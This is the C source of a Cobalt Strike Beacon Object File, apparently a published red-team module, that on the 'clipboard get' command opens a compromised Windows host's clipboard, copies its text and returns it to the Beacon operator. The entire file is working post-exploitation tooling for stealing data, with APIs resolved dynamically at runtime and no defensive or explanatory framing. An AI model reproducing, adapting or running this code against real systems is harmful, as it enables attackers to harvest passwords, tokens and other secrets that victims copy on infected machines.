#include <windows.h>
#include "beacon.h"

#define MAX_CLIPBOARD_SIZE 65536

static void* get_func(const char *dll, const char *func) {
    HMODULE h = LoadLibraryA(dll);
    return h ? (void*)GetProcAddress(h, func) : NULL;
}

typedef BOOL (WINAPI *OPENCLIPBOARD)(HWND);
typedef BOOL (WINAPI *CLOSECLIPBOARD)(void);
typedef HANDLE (WINAPI *GETCLIPBOARDDATA)(UINT);
typedef BOOL (WINAPI *ISCLIPBOARDFORMATAVAILABLE)(UINT);
typedef LPVOID (WINAPI *GLOBALLOCK)(HGLOBAL);
typedef BOOL (WINAPI *GLOBALUNLOCK)(HGLOBAL);

static char output_buf[MAX_CLIPBOARD_SIZE];

void go(char *args, int len) {
    datap parser;
    char *action;
    int al;
    int output_len = 0;
    int has_data = 0;
    
    OPENCLIPBOARD pOpenClipboard = (OPENCLIPBOARD)get_func("user32.dll", "OpenClipboard");
    CLOSECLIPBOARD pCloseClipboard = (CLOSECLIPBOARD)get_func("user32.dll", "CloseClipboard");
    GETCLIPBOARDDATA pGetClipboardData = (GETCLIPBOARDDATA)get_func("user32.dll", "GetClipboardData");
    ISCLIPBOARDFORMATAVAILABLE pIsClipboardFormatAvailable = (ISCLIPBOARDFORMATAVAILABLE)get_func("user32.dll", "IsClipboardFormatAvailable");
    GLOBALLOCK pGlobalLock = (GLOBALLOCK)get_func("kernel32.dll", "GlobalLock");
    GLOBALUNLOCK pGlobalUNLOCK = (GLOBALUNLOCK)get_func("kernel32.dll", "GlobalUnlock");
    
    if (!pOpenClipboard || !pCloseClipboard || !pGetClipboardData || 
        !pIsClipboardFormatAvailable || !pGlobalLock || !pGlobalUNLOCK) {
        BeaconOutput(CALLBACK_ERROR, "[-] Failed to resolve required APIs", 35);
        return;
    }
    
    BeaconDataParse(&parser, args, len);
    action = BeaconDataExtract(&parser, &al);
    
    if (!action || al == 0) {
        BeaconOutput(CALLBACK_ERROR, "[-] Usage: clipboard get|help", 29);
        BeaconOutput(CALLBACK_ERROR, "Developed By: machine1337", 25);
        return;
    }
    
    if (al == 4 && action[0] == 'h' && action[1] == 'e' && action[2] == 'l' && action[3] == 'p') {
        BeaconOutput(CALLBACK_OUTPUT, "[*] Clipboard BOF Help:\n\n  clipboard get  - Retrieve clipboard text content\n  clipboard help - Show this help menu\n", 82);
        BeaconOutput(CALLBACK_ERROR, "Developed By: machine1337", 25);
        return;
    }
    
    if (al < 3 || action[0] != 'g' || action[1] != 'e' || action[2] != 't') {
        BeaconOutput(CALLBACK_ERROR, "[-] Usage: clipboard get|help", 29);
        BeaconOutput(CALLBACK_ERROR, "Developed By: machine1337", 25);
        return;
    }
    
    output_buf[0] = 0;
    
    if (!pOpenClipboard(NULL)) {
        BeaconOutput(CALLBACK_ERROR, "[-] Failed to open clipboard", 28);
        BeaconOutput(CALLBACK_ERROR, "Developed By: machine1337", 25);
        return;
    }
    
    if (pIsClipboardFormatAvailable(13)) {
        HANDLE hData = pGetClipboardData(13);
        if (hData) {
            wchar_t *pwsz = (wchar_t*)pGlobalLock(hData);
            if (pwsz) {
                int i = 0;
                has_data = 1;
                while (pwsz[i] && output_len < MAX_CLIPBOARD_SIZE - 10) {
                    if (pwsz[i] < 128) {
                        output_buf[output_len++] = (char)pwsz[i];
                    } else {
                        output_buf[output_len++] = '?';
                    }
                    i++;
                }
                output_buf[output_len] = 0;
                pGlobalUNLOCK(hData);
            }
        }
    }
    else if (pIsClipboardFormatAvailable(1)) {
        HANDLE hData = pGetClipboardData(1);
        if (hData) {
            char *psz = (char*)pGlobalLock(hData);
            if (psz) {
                has_data = 1;
                while (*psz && output_len < MAX_CLIPBOARD_SIZE - 10) {
                    output_buf[output_len++] = *psz++;
                }
                output_buf[output_len] = 0;
                pGlobalUNLOCK(hData);
            }
        }
    }
    
    pCloseClipboard();
    
    if (!has_data || output_len == 0) {
        BeaconOutput(CALLBACK_OUTPUT, "[*] Clipboard: [empty or non-text data]\n", 40);
        BeaconOutput(CALLBACK_ERROR, "Developed By: machine1337", 25);
        return;
    }
    
    output_buf[output_len++] = '\n';
    output_buf[output_len] = 0;
    
    BeaconOutput(CALLBACK_OUTPUT, output_buf, output_len);
    BeaconOutput(CALLBACK_ERROR, "Developed By: machine1337", 25);
}

/* Developed By: Machine1337 */
